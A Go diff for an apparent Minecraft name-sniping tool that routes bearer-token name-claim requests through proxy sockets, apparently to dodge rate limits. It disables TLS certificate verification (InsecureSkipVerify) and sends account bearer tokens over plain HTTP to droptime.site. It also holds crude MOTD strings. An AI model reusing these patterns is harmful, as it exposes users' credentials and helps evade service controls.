@@ -4,16 +4,18 @@ import (
 	"bufio"
 	"bytes"
 	"crypto/tls"
+	"crypto/x509"
 	"encoding/json"
 	"fmt"
 	"image"
 	"image/color"
 	"image/png"
 	"io/ioutil"
+	"log"
 	"math"
 	"math/rand"
+	"net"
 	"net/http"
-	"net/url"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -88,12 +90,19 @@ type Details struct {
 	UnixRecv   int64
 	Success    bool
 	Email      string
+	Type       string
+}
+
+type Conns struct {
+	Client  *tls.Conn
+	Payload string
 }
 
 var (
-	bearers apiGO.MCbearers
-	list    []string = []string{"Liza ~ Nice Ass", "Noobyte ~ MMMMMMMMMM", "Noobyte ~ Touhou Epik", "Peet ~ Cool Coder Man", "Sniper Comm ~ Shit", "Life ~ 2012", "Kqzz ~ Money Generator", "Liza ~ Taddy Was The King?", "Everest ~ Shit Coder"}
-
+	bearers   apiGO.MCbearers
+	list      []string = []string{"Liza#0002 ~ If your seeing this, join up https://discord.gg/a8EQ97ZfgK", "Liza#0002 ~ Nice Ass", "or#0001 ~ i got a dragon cock", "Noobyte#0000 ~ MMMMMMMMMM", "Noobyte#0000 ~ Touhou Epik", "peet v3#4245 ~ Cool Coder Man", "Steven's Weird#9468 ~ fuck plot armor", "Paid Snipers ~ Not worth the bill", "Steven's Weird#9468 ~ Renting a GF, id rather just buy the girl", "Pock#3483 ~ i still miss soothe", "Kqzz#0001 ~ Money Generator", "Liza#0002 ~ Taddy Was The King?", "; everest ?#7184 ~ Shit Coder"}
+	proxys    []string
+	used      = make(map[string]bool)
 	acc       apiGO.Config
 	err       error
 	images    []image.Image
@@ -101,6 +110,21 @@ var (
 	secondRow [][]int = [][]int{{64, 8, 72, 16}, {56, 8, 64, 16}, {48, 8, 56, 16}, {40, 8, 48, 16}, {32, 8, 40, 16}, {24, 8, 32, 16}, {16, 8, 24, 16}, {8, 8, 16, 16}, {0, 8, 8, 16}}
 	firstRow  [][]int = [][]int{{64, 0, 72, 8}, {56, 0, 64, 8}, {48, 0, 56, 8}, {40, 0, 48, 8}, {32, 0, 40, 8}, {24, 0, 32, 8}, {16, 0, 24, 8}, {8, 0, 16, 8}, {0, 0, 8, 8}}
 )
+
+const rootCert = `-----BEGIN CERTIFICATE-----
+MIIB+TCCAZ+gAwIBAgIJAL05LKXo6PrrMAoGCCqGSM49BAMCMFkxCzAJBgNVBAYT
+AkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRn
+aXRzIFB0eSBMdGQxEjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0xNTEyMDgxNDAxMTNa
+Fw0yNTEyMDUxNDAxMTNaMFkxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0
+YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQxEjAQBgNVBAMM
+CWxvY2FsaG9zdDBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABHGaaHVod0hLOR4d
+66xIrtS2TmEmjSFjt+DIEcb6sM9RTKS8TZcdBnEqq8YT7m2sKbV+TEq9Nn7d9pHz
+pWG2heWjUDBOMB0GA1UdDgQWBBR0fqrecDJ44D/fiYJiOeBzfoqEijAfBgNVHSME
+GDAWgBR0fqrecDJ44D/fiYJiOeBzfoqEijAMBgNVHRMEBTADAQH/MAoGCCqGSM49
+BAMCA0gAMEUCIEKzVMF3JqjQjuM2rX7Rx8hancI5KJhwfeKu1xbyR7XaAiEA2UT7
+1xOP035EcraRmWPe7tO0LpXgMxlh2VItpc2uc2w=
+-----END CERTIFICATE-----
+`
 
 func init() {
 	if runtime.GOOS == "windows" {
@@ -141,6 +165,9 @@ func init() {
 		os.MkdirAll("cropped/logs", 0755)
 	}
 
+	proxys = genProxys()
+	setup(proxys)
+
 	fmt.Print(aurora.White(`
     __  _____________  __
    /  |/  / ___/ __/ |/ /
@@ -149,10 +176,11 @@ func init() {
  `))
 
 	fmt.Print(aurora.Sprintf(aurora.White(`
- Ver: %v
-MOTD: %v
+    Ver: %v
+   MOTD: %v
+Proxies: %v
 
-`), aurora.White(aurora.Sprintf("%v / %v", aurora.Bold(aurora.BrightBlack("4.45")), aurora.Bold(aurora.BrightBlack("Made By Liza")))), aurora.Bold(aurora.BrightBlack(MOTD()))))
+`), aurora.White(aurora.Sprintf("%v / %v", aurora.Bold(aurora.BrightBlack("4.50")), aurora.Bold(aurora.BrightBlack("Made By Liza")))), aurora.Bold(aurora.BrightBlack(MOTD())), aurora.Bold(aurora.BrightBlack(len(proxys)))))
 
 	if acc.DiscordID == "" {
 		var ID string
@@ -188,6 +216,10 @@ func sendW(content string) {
 	fmt.Print(aurora.Sprintf(aurora.White("[%v] "+content), aurora.Green("INPUT")))
 }
 
+func sendT(content string) {
+	fmt.Print(aurora.Sprintf(aurora.White("[%v] "+content), aurora.Green("TIMER")))
+}
+
 func AutoOffset() float64 {
 	var pingTimes int64
 	conn, _ := tls.Dial("tcp", "api.minecraftservices.com:443", nil)
@@ -208,9 +240,9 @@ func jsonValue(f interface{}) []byte {
 	return g
 }
 
-func (account Details) check(name, searches string) {
+func (account Details) check(name, searches, accType string) {
 	var details checkDetails
-	body, _ := json.Marshal(Data{Name: name, Bearer: account.Bearer, Unix: account.UnixRecv, Config: string(jsonValue(embeds{Content: "<@" + acc.DiscordID + ">", Embeds: []embed{{Description: fmt.Sprintf("Succesfully sniped %v with %v searches :bow_and_arrow:", name, searches), Color: 770000, Footer: footer{Text: "MCSN"}, Time: time.Now().Format(time.RFC3339)}}}))})
+	body, _ := json.Marshal(Data{Name: name, Bearer: account.Bearer, Unix: account.UnixRecv, Config: string(jsonValue(embeds{Content: "<@" + acc.DiscordID + ">", Embeds: []embed{{Description: fmt.Sprintf("[%v] Succesfully sniped %v with %v searches :bow_and_arrow:", accType, name, searches), Color: 770000, Footer: footer{Text: "MCSN"}, Time: time.Now().Format(time.RFC3339)}}}))})
 
 	req, _ := http.NewRequest("POST", "http://droptime.site/api/v2/webhook", bytes.NewBuffer(body))
 	req.Header.Set("Content-Type", "application/json")
@@ -573,6 +605,7 @@ func snipe(name string, delay float64, option string, charType string) {
 							Success:    strings.Contains(string(ea[9:12]), "200"),
 							UnixRecv:   recvTime.Unix(),
 							Email:      account.Email,
+							Type:       account.AccountType,
 						})
 
 						wg.Done()
@@ -585,7 +618,7 @@ func snipe(name string, delay float64, option string, charType string) {
 
 			for _, status := range data.Requests {
 				if status.Success {
-					status.check(name, "Turbo")
+					status.check(name, "0", status.Type)
 
 					if acc.ChangeskinOnSnipe {
 						sendInfo := apiGO.ServerInfo{
@@ -877,7 +910,7 @@ func checkVer(name string, delay float64, dropTime int64) {
 				}
 			}
 
-			request.check(name, searches)
+			request.check(name, searches, request.Type)
 
 			fmt.Println()
 
@@ -1028,61 +1061,66 @@ func MOTD() string {
 
 // Proxy code
 
-var used = make(map[*url.URL]bool)
-var conns []*http.Request
-
-func proxy(name string, delay float64) {
+func proxy(name string, delay float64, dropTime int64) {
 	var leng float64
 	var wg sync.WaitGroup
 	var data SentRequests
 	var content string
 
-	dropTime := apiGO.DropTime(name)
-
 	searches, _ := apiGO.Search(name)
 
-	sendI(fmt.Sprintf("Name: %v | Delay: %v | Searches: %v\n", name, delay, searches))
+	sendI(fmt.Sprintf("Name: %v | Delay: %v | Searches: %v | Proxys: %v\n", name, delay, searches, len(proxys)))
 
-	apiGO.PreSleep(dropTime)
+	for time.Now().Before(time.Unix(dropTime, 0).Add(-time.Second * 60)) {
+		sendT(fmt.Sprintf("Generating Proxy Connections In: %v      \r", time.Until(time.Unix(dropTime, 0).Add(-time.Second*60)).Round(time.Second).Seconds()))
+		time.Sleep(time.Second * 1)
+	}
 
-	fmt.Println()
+	clients := genSockets(proxys, name)
 
-	proxy := genProxys()
-	setup(proxy)
-	genHttp(name)
+	fmt.Print("\n\n")
 
 	apiGO.Sleep(dropTime, delay)
 
 	fmt.Println()
 
 	for e, account := range bearers.Details {
-		switch account.AccountType {
-		case "Giftcard":
-			leng = float64(acc.GcReq)
-		case "Microsoft":
-			leng = float64(acc.MFAReq)
-		}
+		if e == len(proxys) {
+			break
+		} else {
+			if account.AccountType == "Giftcard" {
+				leng = float64(acc.GcReq)
+			} else {
+				leng = float64(acc.MFAReq)
+			}
 
-		for i := 0; float64(i) < leng; i++ {
-			wg.Add(1)
-			go func(account apiGO.Info) {
-				sendTime := time.Now()
-				res, err := generateClient(randomInt(proxy)).Do(conns[e])
-				if err == nil {
+			for i := 0; float64(i) < leng; i++ {
+				wg.Add(1)
+				go func(account apiGO.Info, e int) {
+					fmt.Fprintln(clients[e].Client, clients[e].Payload)
+					sendTime := time.Now()
+
+					var ea = make([]byte, 4096)
+
+					clients[e].Client.Read(ea)
 					recvTime := time.Now()
+
 					data.Requests = append(data.Requests, Details{
 						Bearer:     account.Bearer,
 						SentAt:     sendTime,
 						RecvAt:     recvTime,
-						StatusCode: fmt.Sprintf("%v", res.StatusCode),
-						Success:    strings.Contains(fmt.Sprintf("%v", res.StatusCode), "200"),
+						StatusCode: string(ea[9:12]),
+						Success:    string(ea[9:12]) == "200",
 						UnixRecv:   recvTime.Unix(),
 						Email:      account.Email,
+						Type:       account.AccountType,
 					})
-				}
-				wg.Done()
-			}(account)
-			time.Sleep(time.Duration(acc.SpreadPerReq) * time.Microsecond)
+
+					wg.Done()
+				}(account, e)
+
+				time.Sleep(time.Duration(acc.SpreadPerReq) * time.Microsecond)
+			}
 		}
 	}
 
@@ -1110,7 +1148,7 @@ func proxy(name string, delay float64) {
 				}
 			}
 
-			request.check(name, searches)
+			request.check(name, searches, "Proxy")
 
 			fmt.Println()
 
@@ -1123,56 +1161,83 @@ func proxy(name string, delay float64) {
 	}
 
 	logSnipe(content, name)
-
 }
 
-func genProxys() []*url.URL {
-	var proxys []*url.URL
+func genProxys() []string {
+	var proxys []string
 
 	f, _ := os.Open("proxys.txt")
 	defer f.Close()
 	scanner := bufio.NewScanner(f)
 	for scanner.Scan() {
-		url, _ := url.Parse("http://" + scanner.Text())
-		proxys = append(proxys, url)
+		proxys = append(proxys, scanner.Text())
 	}
 
 	return proxys
 }
 
-func randomInt(proxys []*url.URL) *url.URL {
-	for _, proxy := range proxys {
-		if used[proxy] == false {
+func randomInt(proxys []string) string {
+	for {
+		rand.Seed(time.Now().UnixNano())
+		proxy := proxys[rand.Intn(len(proxys))]
+		if !used[proxy] {
 			used[proxy] = true
 			return proxy
 		}
 	}
-
-	return nil
 }
 
-func generateClient(url *url.URL) *http.Client {
-	return &http.Client{
-		Transport: &http.Transport{
-			Proxy: http.ProxyURL(url),
-		},
-	}
-}
-
-func setup(proxy []*url.URL) {
+func setup(proxy []string) {
 	for _, proxy := range proxy {
 		used[proxy] = false
 	}
 }
 
-func genHttp(name string) {
-	for _, account := range bearers.Details {
-		conns = append(conns, httpReq(name, account.Bearer))
+func genSockets(proxy []string, name string) []Conns {
+	var DataType []Conns
+
+	roots := x509.NewCertPool()
+	ok := roots.AppendCertsFromPEM([]byte(rootCert))
+	if !ok {
+		log.Fatal("failed to parse root certificate")
 	}
+
+	for e, bearer := range bearers.Details {
+		if e == len(proxy) {
+			break
+		} else {
+			proxy := randomInt(proxy)
+			conn, err := net.Dial("tcp", proxy)
+			if err != nil {
+				sendE(err.Error())
+			} else {
+
+				conn.Write([]byte("CONNECT api.minecraftservices.com:443 HTTP/1.1\r\nHost: api.minecraftservices.com:443\r\nProxy-Connection: keep-alive\r\nUser-Agent: MCSN/1.1\r\n\r\n"))
+
+				var junk = make([]byte, 4096)
+
+				conn.Read(junk)
+
+				config := &tls.Config{RootCAs: roots, InsecureSkipVerify: true, ServerName: strings.Split(proxy, ":")[0]}
+
+				tls := tls.Client(conn, config)
+
+				if bearer.AccountType == "Giftcard" {
+					DataType = append(DataType, Conns{
+						Client:  tls,
+						Payload: fmt.Sprintf("POST /minecraft/profile HTTP/1.1\r\nHost: api.minecraftservices.com\r\nConnection: open\r\nContent-Length:%s\r\nContent-Type: application/json\r\nAccept: application/json\r\nAuthorization: Bearer %s\r\n\r\n"+string([]byte(`{"profileName":"`+name+`"}`))+"\r\n", strconv.Itoa(len(string([]byte(`{"profileName":"`+name+`"}`)))), bearer.Bearer),
+					})
+				} else {
+					DataType = append(DataType, Conns{
+						Client:  tls,
+						Payload: "PUT /minecraft/profile/name/" + name + " HTTP/1.1\r\nHost: api.minecraftservices.com:443\r\nUser-Agent: MCSN/1.0\r\nAuthorization: bearer " + bearer.Bearer + "\r\n\r\n",
+					})
+				}
+			}
+		}
+	}
+
+	return DataType
 }
 
-func httpReq(name, bearer string) *http.Request {
-	req, _ := http.NewRequest("PUT", "https://api.minecraftservices.com/minecraft/profile/name/"+name, nil)
-	req.Header.Add("Authorization", "Bearer "+bearer)
-	return req
-}
+//
